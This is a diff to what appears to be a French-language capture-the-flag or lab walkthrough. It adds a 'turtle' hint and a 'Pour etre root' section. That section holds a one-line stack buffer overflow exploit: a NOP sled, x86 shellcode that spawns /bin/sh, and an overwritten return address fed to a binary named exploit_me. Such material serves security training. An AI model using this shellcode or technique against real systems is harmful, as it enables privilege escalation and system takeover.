@@ -185,3 +185,17 @@ opekmq
 ```
 Publicspeakingisveryeasy.126241207201b2149opekmq426135
 ```
+
+
+
+## turtle
+
+SLASH => md5
+voir script js
+
+
+## Pour etre root
+
+```
+./exploit_me $(python -c "import struct; print('\x90' * (100) + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * (140 - 120) + struct.pack('<I', 0xbffff600))")
+```
